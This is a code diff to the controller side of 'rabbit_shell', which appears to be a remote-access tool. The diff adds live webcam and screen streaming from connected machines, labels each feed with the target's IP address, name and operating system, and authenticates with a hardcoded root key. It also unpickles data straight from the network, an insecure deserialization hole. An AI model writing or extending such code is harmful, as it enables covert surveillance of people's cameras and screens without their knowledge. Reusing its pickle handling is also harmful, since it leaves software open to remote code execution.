@@ -1,10 +1,11 @@
 import pickle
-import socket
+import threading
+
 from rabbit_shell.controller import client_side, server_side
-from rabbit_shell.data import data, about, basic
+from rabbit_shell.data import data, basic
 from rabbit_shell.background import backstuff
 from rabbit_shell.data.banners import banner
-
+import cv2
 filetrans = server_side.filetrans()
 client_side = client_side.client_side()
 server_side = server_side.server_side()
@@ -19,7 +20,8 @@ class Auther:
         self.host = host
 
         self.index = None
-
+        self.stream = False
+        self.stream_server = client_side.formate_socket()
         self.server = client_side.formate_socket()
 
         self.filetrans_server = client_side.formate_socket()
@@ -45,9 +47,17 @@ class Auther:
         host arg and port from main fun
 
         """
-        to = (host, port)
         return client_side.connect(self.filetrans_server, host, port)
 
+    def connect_tostream(self, host, port):
+
+        client_side.connect(self.stream_server, host, port)
+        key = f"root:{basic.KEY}"
+
+        logdata = {
+            "key": key
+        }
+        return self.stream_server.send(pickle.dumps(logdata))
 
     def send(self, server, index, dt):
 
@@ -81,6 +91,33 @@ class Auther:
             mostly of server timeout
 
             """
+
+    def stream_handle(self):
+
+        while True:
+
+            dt = self.stream_server.recv(data.BUFFER_SIZE)
+            try:
+                dt = pickle.loads(dt)
+            except:
+                continue
+
+            frame = dt["frame"]
+            address = dt["payload"]["ip"]
+            name = dt["payload"]["name"]
+            os = dt["payload"]["os"]
+            if self.stream:
+
+                cv2.imshow(f"name: ({name}) os: ({os}) address: {address}", cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
+            elif not self.stream:
+                cv2.destroyAllWindows()
+            if cv2.waitKey(1) & 0xFF == ord('q'):
+                break
+        cv2.waitKey(0)
+
+        cv2.destroyAllWindows()
+
+
     def runtime(self):
         """
 
@@ -89,8 +126,9 @@ class Auther:
 
         """
         self.connect(self.key, self.host, self.port)
-
+        self.connect_tostream(self.host, self.port - data.CAM_FRAME_PORT)
         self.connect_tofiletrans(self.host, self.port - data.FILETRANS_PORT)
+        threading.Thread(target=self.stream_handle).start()
 
         while True:
 
@@ -116,6 +154,15 @@ class Auther:
                     self.input_mode = data.INPUT_MODE
                     self.index = None
                 elif len(command) != 0:
+
+                    if command == "stream:cam":
+                        self.stream = True
+
+                    elif command == "stream:screen":
+                        self.stream = True
+
+                    elif command == "stream:stop":
+                        self.stream = False
 
                     self.send(self.server, self.index, command)
 
